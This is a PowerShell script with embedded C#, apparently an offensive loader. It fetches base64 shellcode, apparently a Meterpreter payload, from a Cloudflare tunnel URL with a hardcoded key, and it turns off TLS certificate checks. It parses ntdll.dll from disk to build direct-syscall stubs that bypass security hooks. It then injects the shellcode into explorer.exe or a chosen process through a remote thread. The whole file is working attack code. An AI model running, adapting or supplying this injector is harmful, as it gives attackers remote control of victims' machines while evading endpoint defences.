# ============================================================================
# LEVEL 4: FRESH NTDLL + DIRECT SYSCALL (FIXED VERSION)
# ============================================================================
# Reads FRESH ntdll.dll from disk to get clean syscall numbers
# ============================================================================

param(
    [int]$TargetPID = 0  # Pass PID as argument or auto-detect
)

# === CONFIGURATION - Update this URL! ===
# Cloudflare Tunnel (changes on restart): https://decision-provinces-officers-follows.trycloudflare.com/shellcode.txt
# VPS Direct (if needed): https://216.126.227.250:9000/shellcode.txt
$ShellcodeURL = "https://attention-launches-kind-commonly.trycloudflare.com/payloads/shellcode.txt?key=X7k9mP2vL4qR8nT1"

# Trust self-signed certificate
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$code = @'
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class FreshSyscall {
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint protect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
    
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr h);
    
    [DllImport("kernel32.dll")]
    public static extern uint GetLastError();
    
    // FIXED: Correct delegate signatures for x64 Windows
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtAllocateVirtualMemoryDelegate(
        IntPtr ProcessHandle, 
        ref IntPtr BaseAddress, 
        IntPtr ZeroBits,
        ref IntPtr RegionSize,  // FIXED: IntPtr not uint
        uint AllocationType, 
        uint Protect);
    
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtWriteVirtualMemoryDelegate(
        IntPtr ProcessHandle, 
        IntPtr BaseAddress, 
        IntPtr Buffer,
        IntPtr Size,  // FIXED: IntPtr not uint
        ref IntPtr Written);  // FIXED: IntPtr not uint
    
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtCreateThreadExDelegate(
        ref IntPtr ThreadHandle, 
        uint DesiredAccess, 
        IntPtr ObjectAttributes,
        IntPtr ProcessHandle, 
        IntPtr StartAddress, 
        IntPtr Parameter,
        uint Flags,  // 0 = not suspended
        IntPtr StackZeroBits,  // FIXED: IntPtr
        IntPtr SizeOfStackCommit,  // FIXED: IntPtr
        IntPtr SizeOfStackReserve,  // FIXED: IntPtr
        IntPtr AttributeList);
    
    public static uint GetSyscallNumber(string functionName) {
        string ntdllPath = @"C:\Windows\System32\ntdll.dll";
        byte[] ntdllBytes = File.ReadAllBytes(ntdllPath);
        
        int e_lfanew = BitConverter.ToInt32(ntdllBytes, 0x3C);
        int optionalHeaderOffset = e_lfanew + 24;
        int exportDirRVA = BitConverter.ToInt32(ntdllBytes, optionalHeaderOffset + 112);
        int exportDirOffset = RvaToOffset(ntdllBytes, exportDirRVA);
        
        int numberOfNames = BitConverter.ToInt32(ntdllBytes, exportDirOffset + 24);
        int addressOfFunctionsRVA = BitConverter.ToInt32(ntdllBytes, exportDirOffset + 28);
        int addressOfNamesRVA = BitConverter.ToInt32(ntdllBytes, exportDirOffset + 32);
        int addressOfNameOrdinalsRVA = BitConverter.ToInt32(ntdllBytes, exportDirOffset + 36);
        
        int addressOfFunctions = RvaToOffset(ntdllBytes, addressOfFunctionsRVA);
        int addressOfNames = RvaToOffset(ntdllBytes, addressOfNamesRVA);
        int addressOfNameOrdinals = RvaToOffset(ntdllBytes, addressOfNameOrdinalsRVA);
        
        for (int i = 0; i < numberOfNames; i++) {
            int nameRVA = BitConverter.ToInt32(ntdllBytes, addressOfNames + (i * 4));
            int nameOffset = RvaToOffset(ntdllBytes, nameRVA);
            
            string name = "";
            for (int j = 0; j < 256 && ntdllBytes[nameOffset + j] != 0; j++) {
                name += (char)ntdllBytes[nameOffset + j];
            }
            
            if (name == functionName) {
                ushort ordinal = BitConverter.ToUInt16(ntdllBytes, addressOfNameOrdinals + (i * 2));
                int funcRVA = BitConverter.ToInt32(ntdllBytes, addressOfFunctions + (ordinal * 4));
                int funcOffset = RvaToOffset(ntdllBytes, funcRVA);
                
                // Pattern: mov r10, rcx (4C 8B D1) then mov eax, XX (B8 XX XX XX XX)
                if (ntdllBytes[funcOffset] == 0x4C && 
                    ntdllBytes[funcOffset + 1] == 0x8B && 
                    ntdllBytes[funcOffset + 2] == 0xD1 &&
                    ntdllBytes[funcOffset + 3] == 0xB8) {
                    return BitConverter.ToUInt32(ntdllBytes, funcOffset + 4);
                }
                
                if (ntdllBytes[funcOffset] == 0xB8) {
                    return BitConverter.ToUInt32(ntdllBytes, funcOffset + 1);
                }
                
                throw new Exception("Unexpected prologue for " + functionName);
            }
        }
        throw new Exception("Function not found: " + functionName);
    }
    
    private static int RvaToOffset(byte[] peBytes, int rva) {
        int e_lfanew = BitConverter.ToInt32(peBytes, 0x3C);
        short numberOfSections = BitConverter.ToInt16(peBytes, e_lfanew + 6);
        short sizeOfOptionalHeader = BitConverter.ToInt16(peBytes, e_lfanew + 20);
        int sectionHeaderOffset = e_lfanew + 24 + sizeOfOptionalHeader;
        
        for (int i = 0; i < numberOfSections; i++) {
            int sectionOffset = sectionHeaderOffset + (i * 40);
            int virtualAddress = BitConverter.ToInt32(peBytes, sectionOffset + 12);
            int virtualSize = BitConverter.ToInt32(peBytes, sectionOffset + 8);
            int pointerToRawData = BitConverter.ToInt32(peBytes, sectionOffset + 20);
            
            if (rva >= virtualAddress && rva < virtualAddress + virtualSize) {
                return rva - virtualAddress + pointerToRawData;
            }
        }
        return rva;
    }
    
    public static IntPtr CreateSyscallStub(uint syscallNumber) {
        byte[] stub = new byte[] {
            0x4C, 0x8B, 0xD1,  // mov r10, rcx
            0xB8, (byte)syscallNumber, (byte)(syscallNumber >> 8), 
                  (byte)(syscallNumber >> 16), (byte)(syscallNumber >> 24),
            0x0F, 0x05,        // syscall
            0xC3               // ret
        };
        
        IntPtr stubAddr = VirtualAlloc(IntPtr.Zero, (uint)stub.Length, 0x3000, 0x40);
        if (stubAddr == IntPtr.Zero) throw new Exception("VirtualAlloc failed");
        Marshal.Copy(stub, 0, stubAddr, stub.Length);
        return stubAddr;
    }
    
    public static NtAllocateVirtualMemoryDelegate GetNtAllocateVirtualMemory() {
        uint syscall = GetSyscallNumber("NtAllocateVirtualMemory");
        Console.WriteLine("[*] NtAllocateVirtualMemory = 0x" + syscall.ToString("X2"));
        return Marshal.GetDelegateForFunctionPointer<NtAllocateVirtualMemoryDelegate>(CreateSyscallStub(syscall));
    }
    
    public static NtWriteVirtualMemoryDelegate GetNtWriteVirtualMemory() {
        uint syscall = GetSyscallNumber("NtWriteVirtualMemory");
        Console.WriteLine("[*] NtWriteVirtualMemory = 0x" + syscall.ToString("X2"));
        return Marshal.GetDelegateForFunctionPointer<NtWriteVirtualMemoryDelegate>(CreateSyscallStub(syscall));
    }
    
    public static NtCreateThreadExDelegate GetNtCreateThreadEx() {
        uint syscall = GetSyscallNumber("NtCreateThreadEx");
        Console.WriteLine("[*] NtCreateThreadEx = 0x" + syscall.ToString("X2"));
        return Marshal.GetDelegateForFunctionPointer<NtCreateThreadExDelegate>(CreateSyscallStub(syscall));
    }
    
    public static int FindExplorer() {
        foreach (Process p in Process.GetProcessesByName("explorer")) {
            return p.Id;
        }
        return 0;
    }
}
'@

Write-Host ""
Write-Host "=====================================================" -ForegroundColor Magenta
Write-Host "  LEVEL 4: FRESH NTDLL SYSCALL INJECTION (FIXED)    " -ForegroundColor Magenta
Write-Host "=====================================================" -ForegroundColor Magenta

Add-Type -TypeDefinition $code

# Auto-detect PID if not provided
if ($TargetPID -eq 0) {
    $TargetPID = [FreshSyscall]::FindExplorer()
    if ($TargetPID -eq 0) {
        Write-Host "[-] No explorer.exe found!" -ForegroundColor Red
        exit
    }
}
Write-Host "[*] Target PID: $TargetPID" -ForegroundColor Yellow

# Download shellcode
Write-Host "[*] Downloading shellcode..." -ForegroundColor Yellow
try {
    $b64 = (New-Object Net.WebClient).DownloadString($ShellcodeURL)
    $b64 = $b64.Trim()  # Remove any whitespace
    $shellcode = [Convert]::FromBase64String($b64)
    Write-Host "[+] Shellcode: $($shellcode.Length) bytes" -ForegroundColor Green
} catch {
    Write-Host "[-] Download failed: $_" -ForegroundColor Red
    exit
}

# Verify shellcode looks valid (should start with FC 48 for x64 meterpreter)
if ($shellcode.Length -lt 100) {
    Write-Host "[-] Shellcode too small! Check shellcode.txt" -ForegroundColor Red
    exit
}
$firstBytes = ($shellcode[0..3] | ForEach-Object { $_.ToString("X2") }) -join " "
Write-Host "[*] First bytes: $firstBytes" -ForegroundColor Cyan

# Open process
Write-Host "[*] Opening process..." -ForegroundColor Yellow
$hProcess = [FreshSyscall]::OpenProcess(0x1F0FFF, $false, $TargetPID)
if ($hProcess -eq [IntPtr]::Zero) {
    $err = [FreshSyscall]::GetLastError()
    Write-Host "[-] OpenProcess failed! Error: $err" -ForegroundColor Red
    exit
}
Write-Host "[+] Handle: 0x$($hProcess.ToString('X'))" -ForegroundColor Green

# Get syscall delegates
Write-Host ""
Write-Host "[*] Reading FRESH ntdll.dll from disk..." -ForegroundColor Yellow
$NtAlloc = [FreshSyscall]::GetNtAllocateVirtualMemory()
$NtWrite = [FreshSyscall]::GetNtWriteVirtualMemory()
$NtThread = [FreshSyscall]::GetNtCreateThreadEx()
Write-Host ""

# Allocate memory in target
Write-Host "[*] Allocating memory..." -ForegroundColor Yellow
$addr = [IntPtr]::Zero
$size = [IntPtr]::new($shellcode.Length + 0x1000)  # Extra padding
$status = $NtAlloc.Invoke($hProcess, [ref]$addr, [IntPtr]::Zero, [ref]$size, 0x3000, 0x40)
if ($status -ne 0) {
    Write-Host "[-] NtAllocateVirtualMemory failed: 0x$($status.ToString('X8'))" -ForegroundColor Red
    [FreshSyscall]::CloseHandle($hProcess)
    exit
}
Write-Host "[+] Allocated: 0x$($addr.ToString('X16'))" -ForegroundColor Green

# Write shellcode
Write-Host "[*] Writing shellcode..." -ForegroundColor Yellow
$scPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length)
[Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $scPtr, $shellcode.Length)
$written = [IntPtr]::Zero
$status = $NtWrite.Invoke($hProcess, $addr, $scPtr, [IntPtr]::new($shellcode.Length), [ref]$written)
[Runtime.InteropServices.Marshal]::FreeHGlobal($scPtr)
if ($status -ne 0) {
    Write-Host "[-] NtWriteVirtualMemory failed: 0x$($status.ToString('X8'))" -ForegroundColor Red
    [FreshSyscall]::CloseHandle($hProcess)
    exit
}
Write-Host "[+] Wrote: $($written.ToInt64()) bytes" -ForegroundColor Green

# Create thread
Write-Host "[*] Creating remote thread..." -ForegroundColor Yellow
$hThread = [IntPtr]::Zero
$status = $NtThread.Invoke(
    [ref]$hThread, 
    0x1FFFFF,          # THREAD_ALL_ACCESS
    [IntPtr]::Zero,    # ObjectAttributes
    $hProcess,         # ProcessHandle
    $addr,             # StartAddress (shellcode)
    [IntPtr]::Zero,    # Parameter
    0,                 # Flags (0 = run immediately)
    [IntPtr]::Zero,    # StackZeroBits
    [IntPtr]::Zero,    # SizeOfStackCommit
    [IntPtr]::Zero,    # SizeOfStackReserve  
    [IntPtr]::Zero     # AttributeList
)

if ($status -ne 0) {
    Write-Host "[-] NtCreateThreadEx failed: 0x$($status.ToString('X8'))" -ForegroundColor Red
    [FreshSyscall]::CloseHandle($hProcess)
    exit
}

Write-Host "[+] Thread: 0x$($hThread.ToString('X'))" -ForegroundColor Green
Write-Host ""
Write-Host "=====================================================" -ForegroundColor Green
Write-Host "  INJECTION SUCCESSFUL! Check your handler!         " -ForegroundColor Green
Write-Host "=====================================================" -ForegroundColor Green

[FreshSyscall]::CloseHandle($hThread)
[FreshSyscall]::CloseHandle($hProcess)
